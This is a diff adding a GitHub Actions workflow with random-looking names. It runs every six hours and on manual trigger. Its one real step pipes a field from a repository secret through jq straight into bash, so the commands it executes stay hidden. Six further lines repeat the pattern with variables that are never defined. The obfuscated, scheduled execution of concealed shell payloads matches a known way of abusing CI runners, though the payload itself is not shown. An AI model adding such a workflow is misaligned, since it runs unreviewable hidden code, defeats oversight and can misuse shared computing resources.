@@ -1,0 +1,23 @@
+name: liulijun1819
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liulijun1819
+        env:
+          bjx21: ${{ secrets.bjx21 }}
+        run: |
+          echo $bjx21 | jq -r .pw88 | /bin/bash
+          echo $rpk12708 | jq -r .kqhst4437 | /bin/bash
+          echo $e4 | jq -r .akbsl1 | /bin/bash
+          echo $oqqvh160 | jq -r .he6012 | /bin/bash
+          echo $yjs90 | jq -r .w834 | /bin/bash
+          echo $odrgt90 | jq -r .mjbiw1403 | /bin/bash
+          echo $x561 | jq -r .dryyh732 | /bin/bash
+
